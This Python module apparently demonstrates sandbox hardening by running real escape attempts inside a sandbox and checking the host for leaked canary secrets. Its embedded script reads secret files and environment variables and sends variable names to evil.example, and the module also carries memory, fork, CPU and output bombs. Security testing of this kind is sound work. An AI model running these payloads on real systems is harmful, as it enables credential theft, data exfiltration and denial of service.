"""Real escape attempts, run in real sandboxes. Nothing here is mocked for the demo.

Each probe reports what actually happened. The host then checks the sandbox output and the
proxy log for its own secrets, so the headline number doesn't rest on the sandbox's word.
"""
import json
import os

import sandbox

CANARY_ENV = "RECEIPTS_CANARY"

ESCAPE_SCRIPT = r'''
import json, os, socket, struct, urllib.request

def report(pid, title, escaped, detail):
    print(json.dumps({"probe": pid, "title": title, "escaped": escaped, "detail": str(detail)[:300]}), flush=True)

# 1. Secrets
names = sorted(os.environ)
# GPG_KEY ships in the public python image: it's the release signing ID, not a secret, so it's named here rather than hidden.
hits = [n for n in names if n != "GPG_KEY" and any(w in n.upper() for w in ("KEY", "SECRET", "PASSWORD", "TOKEN", "INFERENCE", "CANARY", "VULTR"))]
report("env", "Read API keys from the environment", bool(hits), "variables present: " + ", ".join(names) + ". GPG_KEY is the python image's public signing ID.")

def read(path):
    try:
        with open(path, "rb") as f:
            return f.read(4000)
    except Exception as e:
        return e

r = read("/proc/1/environ")
if isinstance(r, Exception):
    report("proc", "Read process 1's environment", False, repr(r))
else:
    text = r.decode("latin1")
    report("proc", "Read process 1's environment", any(w in text.upper() for w in ("INFERENCE", "CANARY", "VULTR")),
           "only sandbox variables visible, " + str(len(text)) + " bytes")

found = []
for p in ("/app/.env", "/opt/receipts/.env", "/root/.ssh/id_ed25519", "/root/.ssh/authorized_keys", "/etc/shadow", "/etc/receipts/app.env"):
    if not isinstance(read(p), Exception):
        found.append(p)
report("files", "Read host secret files", bool(found), "readable: " + (", ".join(found) or "none"))

report("docker", "Reach the Docker socket to start a privileged container",
       os.path.exists("/var/run/docker.sock"), "socket present" if os.path.exists("/var/run/docker.sock") else "no /var/run/docker.sock")

# 2. Network
def connect(host, port, timeout=3):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True, "connected"
    except Exception as e:
        return False, repr(e)

ok, why = connect("1.1.1.1", 443)
report("direct", "Open a direct connection to the internet", ok, why)

try:
    ip = socket.gethostbyname("receipts-exfil-test.example.com")
    report("dns", "Leak data through a DNS lookup", True, "resolved to " + ip)
except Exception as e:
    report("dns", "Leak data through a DNS lookup", False, repr(e))

try:
    req = urllib.request.Request("https://evil.example/collect?stolen=" + ",".join(names), method="GET")
    urllib.request.urlopen(req, timeout=10)
    report("exfil", "Send stolen data to evil.example through the proxy", True, "request succeeded")
except Exception as e:
    report("exfil", "Send stolen data to evil.example through the proxy", False, repr(e))

ok, why = connect("169.254.169.254", 80)
report("metadata", "Read the Vultr cloud metadata service", ok, why)

gateway = None
try:
    with open("/proc/net/route") as f:
        for line in f.readlines()[1:]:
            parts = line.split()
            if parts[1] == "00000000":
                gateway = socket.inet_ntoa(struct.pack("<L", int(parts[2], 16)))
except Exception:
    pass
# No default route doesn't settle this: the host's bridge address is on the same subnet, so try it directly.
if not gateway:
    gateway = socket.gethostbyname(socket.gethostname()).rsplit(".", 1)[0] + ".1"
open_ports = [p for p in (22, 80, 443, 8100) if connect(gateway, p, 2)[0]]
report("host", "Connect to the host VM (SSH, web, the app itself)", bool(open_ports),
       "host bridge " + gateway + ", open ports: " + (str(open_ports) if open_ports else "none"))

# 3. Disk
writes = []
for p in ("/etc/pwned", "/usr/local/lib/python3.12/site-packages/chain.py", "/bin/pwned"):
    try:
        with open(p, "a") as f:
            f.write("pwned")
        writes.append(p)
    except Exception:
        pass
report("write", "Overwrite system files and the chain helper", bool(writes), "written: " + (", ".join(writes) or "none, filesystem is read-only"))

try:
    with open("/tmp/x.sh", "w") as f:
        f.write("#!/bin/sh\necho ran\n")
    os.chmod("/tmp/x.sh", 0o755)
    import subprocess
    out = subprocess.run(["/tmp/x.sh"], capture_output=True, text=True)
    report("exec", "Drop and run a binary in /tmp", out.returncode == 0, out.stdout or out.stderr)
except Exception as e:
    report("exec", "Drop and run a binary in /tmp", False, repr(e))

# Positive control: the box isn't just dead, the one approved path still works.
try:
    import chain
    latest = chain.rpc("base", "eth_blockNumber")
    print(json.dumps({"control": True, "detail": "allowlisted call worked, Base block " + str(int(latest, 16))}), flush=True)
except Exception as e:
    print(json.dumps({"control": False, "detail": repr(e)}), flush=True)
'''

MEMORY_BOMB = r'''
blocks = []
while True:
    blocks.append(bytearray(32 * 1024 * 1024))
    print("allocated", len(blocks) * 32, "MB", flush=True)
'''

FORK_BOMB = r'''
import os, time
made = 0
try:
    for _ in range(4096):
        pid = os.fork()
        if pid == 0:
            time.sleep(30)
            os._exit(0)
        made += 1
        if made % 8 == 0:
            print("made", made, flush=True)
except OSError as e:
    print("stopped after", made, "processes:", e, flush=True)
    os._exit(0)
print("finished", made, flush=True)
os._exit(0)
'''

CPU_SPIN = "while True:\n    pass\n"

OUTPUT_FLOOD = "import sys\nwhile True:\n    sys.stdout.write('A' * 65536)\n"


def _judge_memory(r):
    held = "allocated" in r["stdout"]
    last = [ln for ln in r["stdout"].splitlines() if ln.startswith("allocated")]
    peak = int(last[-1].split()[1]) if last else 0
    # Escaped would mean going well past the cap without being stopped.
    escaped = r["exit_code"] == 0 or peak > r["limits"]["memory_mb"] * 2
    return escaped, f"stopped at {peak} MB of a {r['limits']['memory_mb']} MB cap (exit {r['exit_code']})" if held else f"exit {r['exit_code']}"


def _judge_fork(r):
    lines = r["stdout"].strip().splitlines()
    last = lines[-1] if lines else ""
    made = next((int(w) for w in last.split() if w.isdigit()), 0)
    escaped = made > r["limits"]["pids"] * 2 or last.startswith("finished")
    return escaped, f"{last or 'no output'}, exit {r['exit_code']} (cap {r['limits']['pids']} processes)"


def _judge_spin(r):
    return r["killed"] != "timeout", f"killed by the host after {r['duration_ms'] / 1000:.1f}s (limit {r['limits']['timeout']}s)"


def _judge_flood(r):
    return r["killed"] != "output_cap", f"killed after {len(r['stdout'])} bytes kept, host memory untouched"


BOMBS = [
    ("memory", "Eat all the VM's memory", MEMORY_BOMB, {"timeout": 12, "memory_mb": 128}, _judge_memory),
    ("fork", "Fork bomb the VM", FORK_BOMB, {"timeout": 10}, _judge_fork),
    ("spin", "Spin the CPU forever", CPU_SPIN, {"timeout": 5}, _judge_spin),
    ("flood", "Flood the app with output", OUTPUT_FLOOD, {"timeout": 10}, _judge_flood),
]


def host_secrets():
    """Values the host knows are secret. Used only to scan for leaks, never sent anywhere."""
    return [v for v in (os.environ.get("INFERENCE_API_KEY"), os.environ.get(CANARY_ENV)) if v]


def leaked(result, secrets):
    haystack = result["stdout"] + result["stderr"] + json.dumps(result["egress"])
    return any(s in haystack for s in secrets)


def parse_escape(stdout):
    probes, control = [], None
    for line in stdout.splitlines():
        try:
            item = json.loads(line)
        except ValueError:
            continue
        if "probe" in item:
            probes.append(item)
        elif "control" in item:
            control = item
    return probes, control


def run_attack(emit, run=None):
    run = run or sandbox.run
    secrets = host_secrets()
    probes = []

    emit("attack_stage", {"title": "Steal secrets, phone home, break out"})
    result = run(ESCAPE_SCRIPT, timeout=60)
    emit("execution", {"title": "Escape attempts", "attempt": 1, "code": ESCAPE_SCRIPT, **result})
    found, control = parse_escape(result["stdout"])
    for p in found:
        emit("probe", p)
    probes += found
    denied = [e for e in result["egress"] if not e["allowed"]]

    for pid, title, code, limits, judge in BOMBS:
        emit("attack_stage", {"title": title})
        r = run(code, **limits)
        escaped, detail = judge(r)
        probe = {"probe": pid, "title": title, "escaped": escaped, "detail": detail,
                 "destroyed": r["destroyed"], "container": r["container"]}
        emit("probe", probe)
        emit("execution", {"title": title, "attempt": 1, "code": code, **r})
        probes.append(probe)
        if leaked(r, secrets):
            result["stdout"] += "\n[host] secret found in bomb output"

    leak = leaked(result, secrets)
    summary = {
        "attempts": len(probes),
        "escaped": sum(1 for p in probes if p["escaped"]),
        "secret_scan_clean": not leak,
        "secrets_checked": len(secrets),
        "denied_by_proxy": denied,
        "control": control,
        "runtime": result["runtime"],
        "all_destroyed": result["destroyed"] and all(p.get("destroyed", True) for p in probes),
    }
    emit("attack_summary", summary)
    return summary
